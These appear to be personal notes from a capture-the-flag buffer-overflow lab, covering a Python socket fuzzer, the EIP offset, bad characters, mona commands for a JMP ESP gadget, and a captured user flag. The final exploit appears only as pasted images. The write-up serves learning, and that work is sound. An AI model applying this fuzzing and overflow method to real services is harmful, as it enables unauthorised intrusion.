port 31337 is used for connection/interacting with the binary

![[Pasted image 20210531130842.png]]

## fuzzing
![[Pasted image 20210531131945.png]]

crashed in 200 bytes
![[Pasted image 20210531134334.png]]

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "192.168.1.108"

port = 31337
timeout = 5
prefix = ""

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      # s.recv(1024)
      #s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string + "\r\n", "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```


## offset

EIP: 39654138
offset: 146
![[Pasted image 20210531134753.png]]

![[Pasted image 20210531134947.png]]

## bad chars
`!mona config -set workingfolder C:\mona`

`!mona bytearray -b "\x00"`

bad chars `\x00\x0a`
![[Pasted image 20210531135930.png]]

## jmp point

`!mona jmp -r esp -epb -b "\x00\x0a"`

080414C3

little endian: `\xc3\x14\x04\x08`

![[Pasted image 20210531140128.png]]

## exploit 

![[Pasted image 20210531140614.png]]

![[Pasted image 20210531140701.png]]

user === {H4lf_W4y_Th3r3}

